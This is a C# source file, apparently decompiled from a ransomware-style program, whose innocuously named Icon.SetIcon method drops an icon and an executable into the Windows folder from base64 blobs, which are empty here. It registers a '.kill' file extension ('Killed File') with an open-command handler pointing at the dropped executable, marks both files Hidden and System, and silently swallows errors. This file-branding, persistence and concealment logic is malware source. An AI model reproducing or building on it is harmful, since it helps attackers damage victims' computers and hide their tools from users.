using System;
using System.IO;
using Microsoft.Win32;

namespace TSVT26;

internal class Icon
{
	public static void SetIcon()
	{
		try
		{
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
			string s = "";
			string text = Help.UniqueID();
			string text2 = folderPath + "\\" + text + ".ico";
			byte[] array = Convert.FromBase64String(s);
			using (FileStream fileStream = new FileStream(text2, FileMode.Create))
			{
				fileStream.Write(array, 0, array.Length);
				fileStream.Flush();
			}
			string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
			string s2 = "";
			string text3 = Help.UniqueID();
			string text4 = folderPath2 + "\\" + text3 + ".exe";
			byte[] array2 = Convert.FromBase64String(s2);
			using (FileStream fileStream2 = new FileStream(text4, FileMode.Create))
			{
				fileStream2.Write(array2, 0, array2.Length);
				fileStream2.Flush();
			}
			string folderPath3 = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
			string text5 = ".kill";
			RegistryKey registryKey = Registry.ClassesRoot.CreateSubKey(text5);
			registryKey.SetValue("", "Killed File");
			registryKey.Close();
			registryKey = Registry.ClassesRoot.CreateSubKey(text5 + "\\Shell\\Open\\command");
			registryKey.SetValue("", "\"" + folderPath3 + "\\" + Help.UniqueID() + ".exe\" \"%L\"");
			registryKey.Close();
			registryKey = Registry.ClassesRoot.CreateSubKey(text5 + "\\DefaultIcon");
			registryKey.SetValue("", folderPath3 + "\\" + Help.UniqueID() + ".ico");
			registryKey.Close();
			FileInfo fileInfo = new FileInfo(text2);
			fileInfo.Attributes |= FileAttributes.Hidden;
			fileInfo.Attributes |= FileAttributes.System;
			FileInfo fileInfo2 = new FileInfo(text4);
			fileInfo2.Attributes |= FileAttributes.Hidden;
			fileInfo2.Attributes |= FileAttributes.System;
		}
		catch
		{
		}
	}
}
